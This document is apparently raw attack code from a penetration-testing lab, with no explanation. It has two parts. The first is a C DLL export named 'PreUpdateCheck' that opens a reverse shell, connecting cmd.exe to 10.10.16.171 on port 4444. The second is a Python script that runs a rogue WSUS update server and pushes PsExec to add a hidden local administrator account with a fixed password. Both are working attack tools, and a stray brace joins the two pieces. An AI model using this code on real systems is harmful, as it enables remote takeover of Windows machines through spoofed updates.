#include <winsock2.h>

__declspec(dllexport) void PreUpdateCheck() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    inet_pton(AF_INET, "10.10.16.171", &sa.sin_addr);

    connect(s, (struct sockaddr*)&sa, sizeof(sa));

    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    PROCESS_INFORMATION pi = {0};
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    WSACleanup();
}

}

```python
import ssl, sys, os, logging, threading
from functools import partial
from http.server import HTTPServer

sys.modules['wsuks.lib.router'] = type(sys)('stub')
sys.modules['wsuks.lib.router'].Router = object

from wsuks.lib.logger import initLogger
initLogger(debug=False)
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

logging.disable(logging.CRITICAL)

HOST    = '0.0.0.0'  # tun0 IP
EXE     = '../../PsExec64.exe'
COMMAND = ('/accepteula -s cmd.exe /c '
           '"net user zsln Password123! /add && '
           'net localgroup Administrators zsln /add"')

exe_bytes = open(EXE, 'rb').read()
h = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')
h.set_resources_xml(COMMAND)

def serve(port, use_tls):
    httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, h))
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('./wsus_combined.pem', './wsus_combined.pem')
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    print(f'[*] Listening on {HOST}:{port} ({"TLS" if use_tls else "HTTP"})')
    httpd.serve_forever()

threading.Thread(target=serve, args=(8530, False), daemon=True).start()
serve(8531, True)
```
